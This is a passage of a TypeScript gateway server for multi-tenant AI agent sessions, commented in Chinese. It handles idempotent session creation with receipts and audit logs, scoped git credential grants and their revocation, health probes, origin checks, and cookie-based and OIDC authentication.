			return;
		}

		if (this.#sessions.size >= (this.#cfg.maxSessions ?? 50)) {
			closeWith(ws, "会话数已达上限", this.#limits);
			return;
		}

		const sessionId = requested ?? randomUUID();
		// S3b：隐式【首次创建】同样写 receipt（operationId 由服务器生成，auto- 前缀）——崩溃后同样能判
		// outcome_unknown，不把「目录已存在」误当成功。重启后 re-attach 到既有会话不是创建，不写收据。
		// scope 解析是纯服务端计算、不是外部副作用，先于收据落盘完成 —— 收据与审计从首条起就带归属。
		const metaFilePath = join(this.#stateRoot, "sessions", sessionId, "meta.json");
		const freshCreation = !existsSync(metaFilePath);
		let scope: { repo: string; team: string };
		try {
			scope = this.#resolveCreationScope(actor, identity.principal, metaFilePath);
		} catch (err) {
			closeWith(ws, err instanceof CreateDeniedError ? err.message : "会话接入失败", this.#limits);
			return;
		}
		const autoReceipt = freshCreation
			? this.#newReceipt(`auto-${randomUUID()}`, "", actor,
				identity.principal ? `${identity.principal.issuer}|${identity.principal.subject}` : actor, sessionId)
			: undefined;
		if (autoReceipt) {
			this.#receipts.save(autoReceipt);
			this.#tryAudit({ kind: "session.create", sessionId, actor, repo: scope.repo, team: scope.team, summary: `创建受理 ${autoReceipt.operationId} stage=accepted` });
		}
		let built: { session: Session; metadata: Meta };
		try {
			built = this.#buildSession(sessionId, actor, identity, scope);
		} catch (err) {
			if (autoReceipt) this.#failReceipt(autoReceipt, err, scope);
			closeWith(ws, err instanceof CreateDeniedError ? err.message : "会话接入失败", this.#limits);
			return;
		}
		const session = built.session;
		if (autoReceipt) {
			this.#stampReceipt(autoReceipt, "workspace_ready");
			this.#tryAudit({ kind: "session.create", sessionId, actor, repo: scope.repo, team: scope.team, summary: `创建 ${autoReceipt.operationId} stage=workspace_ready` });
		}
		attach(ws, session, actor, attachOpts);
		// **必须接住**：start() 的失败路径里会 await this.stop()，而 stop 在
		// 清理失败时会 throw。不接的话一个会话的清理失败会打死整个多租户网关
		// —— 那比静默泄漏一个容器严重得多。
		const started = session.start().then(
			() => {
				if (autoReceipt) {
					this.#stampReceipt(autoReceipt, "harness_ready", "created");
					this.#tryAudit({ kind: "session.create", sessionId, actor, repo: scope.repo, team: scope.team, summary: `创建 ${autoReceipt.operationId} stage=harness_ready` });
				}
			},
			(err) => { if (autoReceipt) this.#failReceipt(autoReceipt, err, scope); throw err; },
		);
		void started.catch((err: unknown) => this.#auditLeak(sessionId, "gateway-start", err));
	}

	/**
	 * S3b：会话创建核心（scope 落盘 → meta 落盘 → git grant → Session 构造 + 登记）。
	 * 从隐式 attach 创建路径原样抽出，显式 create 复用同一条流水线。
	 * 不 attach、不 start。固定拒绝抛 CreateDeniedError（message 面向客户端，可直接回显）；
	 * 其余异常向调用方传播。原 closeWith 拒绝点改为抛错，由调用方按各自通道拒绝。
	 */
	#buildSession(sessionId: string, actor: string, identity: { principal?: Principal; expiresAt: number; sid?: string }, scope: { repo: string; team: string }): { session: Session; metadata: Meta } {
		const ownerDir = join(this.#stateRoot, "sessions", sessionId);
		const metaFile = join(ownerDir, "meta.json");
		mkdirSync(ownerDir, { recursive: true });
		const metadata: Meta = existsSync(metaFile) ? JSON.parse(readFileSync(metaFile, "utf8")) : {
			id: sessionId, owner: actor, ...scope, createdAt: new Date().toISOString(), members: { [actor]: "owner" },
		};
		if (!existsSync(metaFile)) { writeFileSync(metaFile + ".tmp", JSON.stringify(metadata)); renameSync(metaFile + ".tmp", metaFile); }
		// B2：新会话签发 scoped git grant（read 恒有；write 由部署面 allowPush 决定——
		// 无 allowPush 镜像/无 writeRefs 时 write 恒不签发，签发端锁死）。grant 串只进
		// wiring.gitProxyToken（沙箱 HOME 外 .gitconfig），不进任何客户端可见面。
		let gitGrantToken: string | undefined;
		if (this.#cfg.gitGrants) {
			// R72-C3（合同 A2）：grant.repo 必须与代理 parsePath 名全等——由服务端配置的
			// repoUrl 推导 SCM 仓库名（host/path），且必须在 gitGrants.repos 登记才签发。
			// 策略作用域标签（metadata.repo）不是 SCM 仓库，不得混用（demo-app ≠ 代理名）。
			const scmRepo = scmGrantRepo(this.#cfg.repoUrl, this.#cfg.gitGrants.repos);
			if (!scmRepo) {
				throw new CreateDeniedError("git grant 签发拒绝：repoUrl 未配置或未在 gitGrants.repos 登记（fail-closed，固定类别）");
			}
			gitGrantToken = this.#issueGitGrant(sessionId, identity.principal ? `${identity.principal.issuer}|${identity.principal.subject}` : actor, metadata.team, scmRepo, metadata.aclVersion ?? 1, identity.expiresAt);
			// R-Q52-2：登记服务端验证得到的 browser sid ↔ agent session 关联（logout 撤权依据）
			if (identity.sid) linkBrowserSid(this.#gitGrantSessionsByBrowserSid, identity.sid, sessionId);
		}
		let session: Session;
		session = new Session({
			sessionId,
			actor: metadata.owner,
			repo: metadata.repo,
			team: metadata.team,
			workspace: join(this.#cfg.workspaceRoot, sessionId),
			stateDirectory: ownerDir,
			policyFile: this.#cfg.policyFile,
			audit: this.#audit,
			...(this.#cfg.promptLedgerMaxEntries !== undefined ? { promptLedgerMaxEntries: this.#cfg.promptLedgerMaxEntries } : {}),
			// S5a：有界 tail/分页上限透传（未配置时用 Session 默认 200 项 / 1MiB）
			...(this.#cfg.historyTail !== undefined ? { historyTail: this.#cfg.historyTail } : {}),
			model: this.#cfg.model,
			// S4c：scoped 签发密钥下发到会话（Session #start 内按调用 mint；未配置时零影响）
			...(this.#modelScopedKey !== undefined ? { modelScopedKey: this.#modelScopedKey } : {}),
			approvalTimeoutMs: this.#cfg.approvalTimeoutMs,
			wiring: this.#cfg.wiring,
			// HOME 放在 workspace 之外：放在里面的话，agent 一句
			// git add -A && git commit 就把含 token 的 .gitconfig 提交进仓库
			sandboxHome: join(this.#cfg.workspaceRoot, ".homes", sessionId),
			repoUrl: this.#cfg.repoUrl,
			cloneTimeoutMs: this.#cfg.cloneTimeoutMs,
			backend: this.#cfg.backend,
			// 提交身份带上会话发起人，上游提交可归属到具体的人
			...(this.#cfg.wiring ? { wiring: { ...this.#cfg.wiring, authorEmail: actor, ...(gitGrantToken ? { gitProxyToken: gitGrantToken } : {}) } } : {}),
			// B2 生命周期钩子：dispose/acl 变更先撤登记与 jti（持久化）再继续 cleanup
			...(this.#cfg.gitGrants ? {
				onDisposed: () => this.#revokeGitGrantSession(sessionId),
				onAclChanged: (v: number) => {
					// R74（round-12 §3 方案 a）：acl 变更先撤销旧 grant（A6 fail-closed 不可放宽：
					// 旧 aclVersion 必须失效），会话仍存活且 owner 仍被授权时立即以新 aclVersion
					// 重签并投递沙箱 HOME（复用 renew 同缝事务）——「运行中 share 新增审批人」后
					// push 不再必然 403。任一步失败：旧不复活、新不可用 + 回调侧固定类别审计。
					// owner 被吊销/无权/会话已死：只撤销不重签（纵深防御）。
					const prior = this.#gitGrantActive.get(sessionId);
					const scope = prior ? { principal: prior.principal, tenant: prior.tenant, repo: prior.repo, maxExpAt: prior.maxExpAt ?? null } : null;
					this.#revokeGitGrantSession(sessionId); // 旧 jti 全撤 + 持久化（先于重签）
					if (!scope) return; // 本就无 grant：无旧可撤也无从重签
					const session = this.#sessions.get(sessionId);
					const owner = this.#owners.get(sessionId);
					if (!session || !session.alive || !owner || this.#revoked.has(owner) || this.#revoked.has(scope.principal)) return;
					if (!this.#isAuthorized(owner, this.#livePrincipal(owner), metas.get(session)!.data)) return;
					this.#remintGitGrant(sessionId, owner, scope, v);
				},
				// R51 H4：初始 aclVersion 在 mint/构造时正确建立；attach 重建同值重设不触发 revoke
				aclVersion: metadata.aclVersion ?? 1,
			} : {}),
			isProduction: this.#cfg.mode === "production",
			getRole: (a: string) => roleOf(metas.get(session)?.data ?? metadata, a),
			getPrincipal: (a: string) => {
				const activeConn = [...(transports.get(session) ?? [])].find((c) => c.actor === a && !c.closed && !c.revoked)
					?? [...this.#conns].find((c) => c.actor === a && !c.closed && !c.revoked);
				const p = activeConn?.principal;
				return p ? `${p.issuer}|${p.subject}` : (activeConn?.principal?.id ?? a);
			},
			isAuthorized: (a: string): boolean => {
				const activeConn = [...(transports.get(session) ?? [])].find((c) => c.actor === a && !c.closed && !c.revoked)
					?? [...this.#conns].find((c) => c.actor === a && !c.closed && !c.revoked);
				if (!activeConn) return false;
				return this.#isAuthorized(a, activeConn.principal, metas.get(session)?.data ?? metadata);
			},
			send: (ev, seq, target) => broadcast(session, ev, seq, target, (a, p, m) => this.#isAuthorized(a, p, m)),
		});
		metas.set(session, { file: metaFile, data: metadata });
		this.#sessions.set(sessionId, session);
		this.#owners.set(sessionId, actor);
		// S5a2：测试/故障注入缝（生产不配置，零行为影响）
		this.#cfg.sessionProbe?.(session);
		return { session, metadata };
	}

	// ── S3b：显式创建收据（handoff §3.1）──

	/**
	 * 策略作用域由服务端决定：客户端自选 repo/team 等于自选适用规则。
	 * production 由 principal（组映射）推导，推导不出来就拒绝创建，不回落到默认 scope。
	 * scope 解析是纯计算，先于收据落盘与一切外部副作用完成（解析失败 = 从未受理，无收据）。
	 */
	#resolveCreationScope(actor: string, principal: Principal | undefined, metaFile: string): { repo: string; team: string } {
		const fallback = { repo: "default", team: "default" };
		if (existsSync(metaFile)) return fallback; // 既有会话：归属以磁盘 meta 为准，不需要 scope
		const resolved = this.#cfg.resolveScope ? this.#cfg.resolveScope(actor, principal) : this.#cfg.mode === "demo" ? fallback : undefined;
		if (!resolved) throw new CreateDeniedError("无权创建会话");
		return resolved;
	}

	#newReceipt(operationId: string, requestHash: string, actor: string, principalId: string, sessionId: string): CreateReceipt {
		const now = new Date().toISOString();
		return { operationId, principalId, requestId: `req-${randomUUID()}`, requestHash, sessionId, stage: "accepted", outcome: "pending", createdAt: now, updatedAt: now };
	}

	/** stage 推进落盘；写失败不阻断主线（磁盘 unknown，内存态已推进，审计可见） */
	#stampReceipt(receipt: CreateReceipt, stage: ReceiptStage, outcome: ReceiptOutcome = "pending"): void {
		receipt.stage = stage;
		receipt.outcome = outcome;
		receipt.updatedAt = new Date().toISOString();
		try { this.#receipts.save(receipt); } catch { /* 磁盘 unknown；固定类别审计不在这里重复 */ }
	}

	/** 终态 failed：固定类别审计可见。幂等重放会原样返回它，不自动重做外部副作用 */
	#failReceipt(receipt: CreateReceipt, err: unknown, scope?: { repo: string; team: string }): void {
		this.#stampReceipt(receipt, "failed", "failed");
		this.#tryAudit({ kind: "session.create", sessionId: receipt.sessionId, actor: receipt.principalId, repo: scope?.repo, team: scope?.team, summary: `创建失败 ${receipt.operationId} stage=failed（固定类别）`, verdict: "deny" });
		void err;
	}

	/** 定向应答帧（不广播、不带 seq，与 attach 内 sendError 同缝）：创建方连接自行消费 */
	#replyCreated(conn: Conn, receipt: CreateReceipt, replayed: boolean): void {
		conn.outbox.send(JSON.stringify({ event: {
			type: "session.created", operationId: receipt.operationId, requestId: receipt.requestId,
			sessionId: receipt.sessionId, stage: receipt.stage, outcome: receipt.outcome, replayed,
		} }));
	}

	#replyCreateError(conn: Conn, message: string): void {
		conn.outbox.send(JSON.stringify({ event: { type: "error", code: "command_failed", message } }));
	}

	/**
	 * S3b：显式创建命令（WS {type:"create", operationId, requestHash?}）。
	 * 幂等语义：同 principal+operationId+requestHash → 返回原收据（审计标 replay，不新建资源）；
	 * 同键不同内容 → 固定类别拒绝；不同 principal 即使同键也不共用收据（按 principal 哈希目录隔离）。
	 * 同键并发的显式创建单飞（进程内互斥）：所有等待者拿同一 sessionId；跨进程由 S3a stateRoot 独占锁保证。
	 * 非终态收据（崩溃残留已恢复为 outcome_unknown）原样返回：不当成功、不自动重做外部副作用。
	 */
	#handleCreateCommand(conn: Conn, cmd: Extract<ClientCommand, { type: "create" }>, actor: string): void {
		if (this.#draining || this.#closed) { this.#replyCreateError(conn, "网关正在关闭，拒绝新任务"); return; }
		const principalId = conn.principal ? `${conn.principal.issuer}|${conn.principal.subject}` : actor;
		const requestHash = cmd.requestHash ?? "";
		let existing: CreateReceipt | undefined;
		try {
			existing = this.#receipts.load(principalId, cmd.operationId);
		} catch (err) {
			// 损坏收据绝不能按「不存在」处理 —— 那会为同一键创建第二个会话
			void err;
			this.#replyCreateError(conn, "创建收据损坏，拒绝创建（固定类别；交运维处理）");
			return;
		}
		if (existing) {
			if (existing.requestHash !== requestHash) {
				this.#tryAudit({ kind: "session.create", sessionId: existing.sessionId, actor, summary: `创建冲突：operationId ${cmd.operationId} 已用于不同内容，拒绝（固定类别）`, verdict: "deny" });
				this.#replyCreateError(conn, "operationId 已用于不同内容，拒绝（固定类别）");
				return;
			}
			this.#tryAudit({ kind: "session.create", sessionId: existing.sessionId, actor, summary: `创建重放（replay）：${cmd.operationId} 返回原收据` });
			this.#replyCreated(conn, existing, true);
			return;
		}
		if (this.#sessions.size >= (this.#cfg.maxSessions ?? 50)) { this.#replyCreateError(conn, "会话数已达上限"); return; }
		const key = `${createHash("sha256").update(principalId).digest("hex")}\u0000${cmd.operationId}`;
		const inflight = this.#createInflight.get(key);
		if (inflight) {
			// 同键并发：跟随在途创建，所有等待者得到同一 sessionId/收据
			void inflight.then(
				(receipt) => {
					this.#tryAudit({ kind: "session.create", sessionId: receipt.sessionId, actor, summary: `创建重放（replay）：${cmd.operationId} 并发等待同一结果` });
					this.#replyCreated(conn, receipt, true);
				},
				() => this.#replyCreateError(conn, "会话创建失败（固定类别）"),
			);
			return;
		}
		const run = this.#runCreate(cmd.operationId, requestHash, actor, principalId, conn);
		this.#createInflight.set(key, run);
		// 双分支都接住：清理单飞表的同时避免未处理 rejection
		void run.then(() => this.#createInflight.delete(key), () => this.#createInflight.delete(key));
		void run.then(
			(receipt) => this.#replyCreated(conn, receipt, false),
			(err) => this.#replyCreateError(conn, err instanceof CreateDeniedError ? err.message : "会话创建失败（固定类别）"),
		);
	}

	/** S3b：显式创建执行体。先落 accepted 收据，再做外部副作用（工作区、harness）；任一步
	 * 失败收据终态 failed。createStageProbe 仅供测试故障注入（生产不配置），隐式创建不经过它。 */
	async #runCreate(operationId: string, requestHash: string, actor: string, principalId: string, conn: Conn): Promise<CreateReceipt> {
		const sessionId = randomUUID();
		// scope 解析（纯计算）先于收据与副作用；解析失败 = 从未受理（无收据，固定拒绝）
		const scope = this.#resolveCreationScope(actor, conn.principal, join(this.#stateRoot, "sessions", sessionId, "meta.json"));
		const receipt = this.#newReceipt(operationId, requestHash, actor, principalId, sessionId);
		this.#receipts.save(receipt); // 先落身份与 stage，再做任何外部副作用（写失败即拒绝创建）
		this.#tryAudit({ kind: "session.create", sessionId, actor, repo: scope.repo, team: scope.team, summary: `创建受理 ${operationId} stage=accepted` });
		try {
			const probe = this.#cfg.createStageProbe;
			if (probe) await probe("accepted", sessionId);
			const { session } = this.#buildSession(sessionId, actor, { principal: conn.principal, expiresAt: conn.expiresAt, sid: conn.sid }, scope);
			this.#stampReceipt(receipt, "workspace_ready");
			this.#tryAudit({ kind: "session.create", sessionId, actor, repo: scope.repo, team: scope.team, summary: `创建 ${operationId} stage=workspace_ready` });
			if (probe) await probe("workspace_ready", sessionId);
			const settled = session.start().then(
				() => this.#stampReceipt(receipt, "harness_ready", "created"),
				(err) => { this.#failReceipt(receipt, err, scope); throw err; },
			);
			await settled;
			this.#tryAudit({ kind: "session.create", sessionId, actor, repo: scope.repo, team: scope.team, summary: `创建 ${operationId} stage=harness_ready` });
			return receipt;
		} catch (err) {
			if (receipt.stage !== "failed") this.#failReceipt(receipt, err, scope);
			throw err;
		}
	}


	/** 实际监听端口上的默认回环 Host（仅 demo 且未显式配置 allowedHosts 时使用） */
	#loopbackHost(host: string): boolean {
		const addr = this.#http.address();
		return typeof addr === "object" && !!addr && new RegExp(`^(127\\.0\\.0\\.1|localhost|\\[::1\\]):${addr.port}$`, "i").test(host);
	}

	#hostOk(req: IncomingMessage): boolean {
		const host = req.headers.host;
		if (this.#hosts) return hostAllowed(host, this.#hosts);
		return !!host && this.#loopbackHost(host);
	}

	/** 浏览器发的 Origin 必须精确命中；demo 默认只认同源回环；production 只准 https */
	#originOk(origin: string): boolean {
		if (this.#cfg.mode === "production" && !origin.toLowerCase().startsWith("https://")) return false;
		if (this.#origins) return originAllowed(origin, this.#origins);
		return origin.toLowerCase().startsWith("http://") && this.#loopbackHost(origin.slice(7));
	}

	#isAuthorized(actor: string, principal: Principal | undefined, meta: Meta): boolean {
		if (this.#cfg.mode === "demo") return true;
		if (this.#cfg.authorizeResource) {
			return this.#cfg.authorizeResource(actor, principal, { repo: meta.repo, team: meta.team });
		}
		if (this.#cfg.resolveScope) {
			const scope = this.#cfg.resolveScope(actor, principal);
			return !!scope && scope.repo === meta.repo && scope.team === meta.team;
		}
		return false;
	}

	async #onRequest(req: IncomingMessage, res: ServerResponse): Promise<void> {
		let url: URL;
		try { url = new URL(req.url ?? "/", "http://localhost"); } catch { res.writeHead(400).end("bad request"); return; }
		if (!this.#hostOk(req)) { res.writeHead(421).end("misdirected request"); return; }
		// S3a：liveness 与 readiness 分离（handoff §3.3）。与既有静态路由同一入口规则：
		// Host 校验必须过；无鉴权、不读 Cookie、不返回任何会话数据，响应只有固定类别短文本。
		if (url.pathname === "/livez" || url.pathname === "/readyz") {
			if (req.method !== "GET" && req.method !== "HEAD") { res.writeHead(405, { allow: "GET, HEAD" }).end("method not allowed"); return; }
			if (url.pathname === "/livez") { res.writeHead(200, { "cache-control": "no-store" }).end("ok"); return; }
			const ok = this.#isReady();
			res.writeHead(ok ? 200 : 503, { "cache-control": "no-store" }).end(ok ? "ok" : "not ready");
			return;
		}
		// B2：签发方 internal registry 端点（仅内网受信消费）。internalToken 只收
		// Authorization header（production 拒任何 query 形态）。
		if (url.pathname === "/internal/git/registry") {
			if (!this.#cfg.gitGrants) { res.writeHead(404).end("not found"); return; }
			const authz = req.headers.authorization;
			const bearer = typeof authz === "string" && authz.startsWith("Bearer ") ? authz.slice(7) : null;
			if (url.searchParams.size > 0) { res.writeHead(403).end("forbidden"); return; }
			if (!bearer || bearer !== this.#cfg.gitGrants.internalToken) { res.writeHead(401).end("unauthorized"); return; }
			res.writeHead(200, { "content-type": "application/json" });
			res.end(JSON.stringify(this.#gitRegistrySnapshot()));
			return;
		}
		// R76-R3：demo 浏览器入口 —— hash token 经 /auth/session 换与生产同形态的会话 Cookie
		//（静态网关 token 换 Cookie 仅限 demo；production 走下方 IdP 验签流程，行为不变）
		if (this.#cfg.mode === "demo" && url.pathname === "/auth/session") {
			await this.#demoSessionRoute(req, res, url);
			return;
		}
		if (this.#cfg.mode === "production" && url.pathname.startsWith("/auth/")) { await this.#authRoute(req, res, url); return; }
		if (req.method !== "GET" && req.method !== "HEAD") { res.writeHead(405, { allow: "GET, HEAD" }).end("method not allowed"); return; }
		this.#serveStatic(req, res, url);
	}

	/** S3a：readiness 判定。只返回布尔；失败细节不进响应（固定类别短文本，不泄露路径/配置/错误原文）
	 * S3b（复审 note-1/2/3）：draining/close 即时翻红不走缓存；其余结果 ≥1s 复用（限频）；
	 * 探针文件名唯一（并发探测互不覆盖、不误报 503），失败路径清理自己产生的全部文件不残留 */
	#isReady(): boolean {
		if (this.#draining || this.#closed) return false;
		const now = Date.now();
		if (now - this.#readyCacheAt < 1_000) return this.#readyCacheOk;
		const ok = this.#computeReady();
		this.#readyCacheAt = now;
		this.#readyCacheOk = ok;
		return ok;
	}

	#computeReady(): boolean {
		if (!lockStillHeld(this.#lock)) return false; // 锁仍由本实例持有
		// 策略可加载的前提：配置在位（策略本体由会话启动时经 runtime 加载，网关层只验在位）
		if (!existsSync(this.#cfg.policyFile)) return false;
		// stateRoot 可写：探针走 tmp+rename+unlink，与既有持久化同一写路径；
		// 探针与 tmp 名都带 pid+随机后缀 —— 固定名下 A.unlink 与 B.unlink 的竞争会瞬时假 503
		const probe = join(this.#stateRoot, `.readyz-probe-${process.pid}-${randomUUID()}`);
		const tmp = `${probe}.tmp`;
		try {
			writeFileSync(tmp, "1", { mode: 0o600 });
			renameSync(tmp, probe);
			unlinkSync(probe);
		} catch {
			// 失败探针不残留：清理本次产生的两个文件（各自唯一名，不误删他人）
			for (const leftover of [tmp, probe]) { try { unlinkSync(leftover); } catch { /* 不存在或不可删 */ } }
			return false;
		}
		try { this.#audit.checkWritable(); } catch { return false; }
		return true;
	}

	/** R76-R3：demo 专用 —— 静态网关 token（+ 自报 actor）换与生产同形态的会话 Cookie。
	 * app.js 既有「hash token → POST /auth/session → Cookie → WS」流程因此可在 demo 跑通；
	 * production 的 /auth/session 仍走 IdP 验签（#authRoute），静态 token 不被接受。 */
	async #demoSessionRoute(req: IncomingMessage, res: ServerResponse, url: URL): Promise<void> {
		const send = (status: number, headers: Record<string, string> = {}) => {
			if (!res.headersSent) res.writeHead(status, { "cache-control": "no-store", ...headers }).end();
		};
		if (req.method !== "POST") return send(405, { allow: "POST" });
		const origin = req.headers.origin;
		if (typeof origin !== "string" || !this.#originOk(origin)) return send(403);
		if (url.search) return send(400);
		let hasBody = false;
		req.on("data", () => {
			hasBody = true;
			req.destroy();
			send(400);
		});
		if (hasBody) return;
		if (!this.#authRateLimiter.allow()) return send(429);
		const credential = bearer(req.headers.authorization);
		if (!credential || !timingSafeEqual(createHash("sha256").update(credential).digest(), this.#demoToken!)) return send(401);
		// R78：更名 x-demo-actor——x-perimeter-* 命名空间在 gitproxy 合同里固定为
		// 「客户端头不进授权判定」，demo 自报身份不再占用它。
		const actorHeader = req.headers["x-demo-actor"];
		const actor = (typeof actorHeader === "string" ? actorHeader : Array.isArray(actorHeader) ? actorHeader[0] : undefined) ?? "demo@local";
		if (actor.length === 0 || actor.length > 256) return send(401);
		if (this.#revoked.has(actor)) return send(401);
		let session: { id: string; expiresAt: number };
		try {
			const expiresAt = Date.now() + (this.#cfg.browserSessionMaxMs ?? 8 * 3600_000);
			const principal: Principal = { id: actor, issuer: "demo", subject: actor, groups: [], expiresAt };
			// 与生产同形态的会话 Cookie（__Host- 前缀 + HttpOnly + Secure + SameSite=Strict；
			// 127.0.0.1 属浏览器 trustworthy origin，Secure 可写入）
			session = this.#browser.create(principal, this.#cfg.browserSessionMaxMs ?? 8 * 3600_000);
			this.#saveSessions();
		} catch {
			return send(503);
		}
		const maxAge = Math.max(0, Math.floor((session.expiresAt - Date.now()) / 1000));
		return send(204, { "set-cookie": `${SESSION_COOKIE}=${session.id}; Path=/; Max-Age=${maxAge}; HttpOnly; Secure; SameSite=Strict` });
	}

	/**
	 * 浏览器会话入口：携带 IdP 签发的短期 Bearer，换取同源 HttpOnly cookie。
	 * CSRF 防护 = Origin 必须精确命中 + 凭证只能放 Authorization 头（跨站表单/简单请求发不出）+ SameSite=Strict。
	 * 注意：这里不实现 OIDC 授权码 + PKCE 的浏览器登录交互；token 由前置登录页/反向代理取得后提交。
	 */
	async #executeAuth(
		credential: string,
		onTimeout: () => void,
		signal?: AbortSignal,
	): Promise<
		| { ok: true; val: Principal }
		| { ok: false; reason: "busy" | "timeout" | "unauthorized" }
	> {
		if (!this.#authGate.acquire()) {
			return { ok: false, reason: "busy" };
		}

		const ctrl = new AbortController();
		this.#authControllers.add(ctrl);

		if (signal) {
			if (signal.aborted) {
				ctrl.abort();
			} else {
				signal.addEventListener("abort", () => ctrl.abort(), { once: true });
			}
		}

		let settled = false;
		let timedOut = false;
		let timer: NodeJS.Timeout | undefined;
		const timeoutMs = this.#cfg.authTimeoutMs ?? 5_000;

		// 底层真实任务 Promise：持有 slot 直到底层 settle
		const authPromise = (async () => {
			try {
				return await this.#cfg.auth!.authenticate(credential, { signal: ctrl.signal });
			} finally {
				// 不支持取消的自定义 adapter 未 settle 前不能释放实际工作 slot！
				this.#authGate.release();
				this.#authControllers.delete(ctrl);
			}
		})();

		// 超时 Promise：超时时立即让调用方返回，不再等待底层的挂起 Promise
		const timeoutPromise = new Promise<{ ok: false; reason: "timeout" }>((resolve) => {
			timer = setTimeout(() => {
				if (!settled) {
					settled = true;
					timedOut = true;
					ctrl.abort();
					onTimeout();
					resolve({ ok: false, reason: "timeout" });
				}
			}, timeoutMs);
			timer.unref();
		});

		try {
			const res = await Promise.race([
				authPromise.then(
					(val) => {
						settled = true;
						if (timedOut || ctrl.signal.aborted || this.#closed) {
							return { ok: false as const, reason: "timeout" as const };
						}
						return { ok: true as const, val };
					},
					() => {
						settled = true;
						return { ok: false as const, reason: timedOut ? ("timeout" as const) : ("unauthorized" as const) };
					},
				),
				timeoutPromise,
			]);
			return res;
		} finally {
			if (timer) clearTimeout(timer);
		}
	}

	/**
	 * 浏览器会话入口：
	 * 1. OIDC Authorization Code + PKCE S256 流程（/auth/oidc/login 与 /auth/oidc/callback）
	 * 2. 携带 IdP 签发的短期 Bearer 换取同源 HttpOnly cookie（/auth/session）
	 * 3. 会话登出（/auth/logout）
	 */
	async #authRoute(req: IncomingMessage, res: ServerResponse, url: URL): Promise<void> {
		const send = (status: number, headers: Record<string, string> = {}) => {
			if (!res.headersSent) res.writeHead(status, { "cache-control": "no-store", ...headers }).end();
		};

		if (url.pathname === "/auth/oidc/login") return this.#handleOidcLogin(req, res, url, send);
		if (url.pathname === "/auth/oidc/callback") return this.#handleOidcCallback(req, res, url, send);

		const origin = req.headers.origin;
		if (req.method !== "POST") return send(405, { allow: "POST" });
		if (typeof origin !== "string" || !this.#originOk(origin)) return send(403);
		if (url.search) return send(400);

		const contentLength = req.headers["content-length"];
		if (contentLength !== undefined && contentLength !== "0") return send(400);
		if (req.headers["transfer-encoding"] !== undefined) return send(400);

		if (!this.#authRateLimiter.allow()) return send(429);

		let hasBody = false;
		req.on("data", () => {
			hasBody = true;
			req.destroy();
			send(400);
		});

		if (hasBody) return;
		const cookieName = SESSION_COOKIE;
		if (url.pathname === "/auth/session") {
			const credential = bearer(req.headers.authorization);
			if (!credential) return send(401);

			const clientCtrl = new AbortController();
			req.socket?.on("close", () => {
				if (!res.writableEnded && req.socket?.destroyed) clientCtrl.abort();
			});

			const authRes = await this.#executeAuth(
				credential,
				() => { req.destroy(); send(504); },
				clientCtrl.signal,
			);
			if (!authRes.ok) {
				if (authRes.reason === "busy") return send(503);
				if (authRes.reason === "timeout") return;
				return send(401);
			}
			const principal = authRes.val;
			if (this.#revoked.has(principal.id)) return send(401);
			let session: { id: string; expiresAt: number };
			try {
				session = this.#browser.create(principal, this.#cfg.browserSessionMaxMs ?? 8 * 3600_000);
				this.#saveSessions();
			} catch { return send(503); }
			const maxAge = Math.max(0, Math.floor((session.expiresAt - Date.now()) / 1000));
			return send(204, { "set-cookie": `${cookieName}=${session.id}; Path=/; Max-Age=${maxAge}; HttpOnly; Secure; SameSite=Strict` });
		}
		if (url.pathname === "/auth/logout") {
			const sid = cookieOf(req.headers.cookie, cookieName);
			this.#flushPendingLogoutPersistence(); // R55-C：重试入口（上次 save 失败的 tombstones 补盘）
			if (sid) {
				// R55-C：logout 事务——内存先全部撤（browser/conn/WS 各自独立），一次 git
				// 登记 save；save 失败：固定审计 + 非 204 + **映射保留**（重试入口在，不靠
				// 已清 cookie 的 sid 不再发作作保证）；不 ban principal（再登录可用）；无关
				// browser 会话不受影响。
				let firstErr: unknown = null;
				const related = this.#cfg.gitGrants ? peekSessionsForBrowserSid(this.#gitGrantSessionsByBrowserSid, sid) : [];
				for (const agentSessionId of related) {
					try { this.#revokeGitGrantSessionInMemory(agentSessionId); } catch (err) { firstErr ??= err; }
				}
				try { this.#browser.delete(sid); } catch (err) { firstErr ??= err; }
				try { this.#saveSessions(); } catch (err) {
					firstErr ??= err;
					this.#pendingLogoutPersistence.add(sid); // R57-5：browser snapshot 也进重试（#loadSessions 否则恢复旧 sid）
				}
				for (const conn of [...this.#conns]) {
					if (conn.sid === sid) {
						// R57-5：closed/outbox/ws.close 各自独立 try——clear 抛不跳 close，其余 conn 继续
						try { conn.closed = true; } catch (err) { firstErr ??= err; }
						try { conn.outbox.clear(); } catch (err) { firstErr ??= err; }
						try { conn.ws.close(4001, "已登出"); } catch (err) { firstErr ??= err; }
					}
				}
				if (this.#cfg.gitGrants && related.length > 0) {
					try {
						this.#saveGitGrantRegistry(); // 撤全部目标后一次 save（含 revoked tombstones）
						takeSessionsForBrowserSid(this.#gitGrantSessionsByBrowserSid, sid); // 确认后才删映射
					} catch (err) {
						firstErr ??= err;
						this.#pendingLogoutPersistence.add(sid); // 重试入口保留（映射未删）
					}
				}
				if (firstErr !== null) {
					try { this.#audit.append({ kind: "error", sessionId: sid, actor: "system", summary: "logout 清理链部分失败（内存撤销已生效；固定类别）" }); } catch { /* 审计也失败仍非 204 */ }
					return send(500);
				}
			}
			return send(204, { "set-cookie": `${cookieName}=; Path=/; Max-Age=0; HttpOnly; Secure; SameSite=Strict` });
		}
		send(404);
	}

	async #handleOidcLogin(
		req: IncomingMessage,
		res: ServerResponse,
		url: URL,
		send: (status: number, headers?: Record<string, string>) => void,
	): Promise<void> {
		if (!this.#cfg.oidc) return send(404);
		if (req.method !== "GET") return send(405, { allow: "GET" });

		const verifier = randomBytes(32).toString("base64url");
		const challenge = createHash("sha256").update(verifier).digest("base64url");
		const state = randomBytes(24).toString("base64url");
		const nonce = randomBytes(24).toString("base64url");
		const exp = Date.now() + 300_000; // 5分钟短 TTL

		const payloadStr = JSON.stringify({ verifier, state, nonce, exp });
		const payloadB64 = Buffer.from(payloadStr).toString("base64url");
		const sig = createHmac("sha256", this.#pkceSecret).update(payloadB64).digest("base64url");
		const cookieVal = `${payloadB64}.${sig}`;

		let authUrl: URL;
		try {
			authUrl = new URL(this.#cfg.oidc.authorizationEndpoint);
		} catch {
			return send(500);
		}
		authUrl.searchParams.set("response_type", "code");
		authUrl.searchParams.set("client_id", this.#cfg.oidc.clientId);
		authUrl.searchParams.set("redirect_uri", this.#cfg.oidc.redirectUri);
		authUrl.searchParams.set("scope", this.#cfg.oidc.scope ?? "openid profile");
		authUrl.searchParams.set("state", state);
		authUrl.searchParams.set("nonce", nonce);
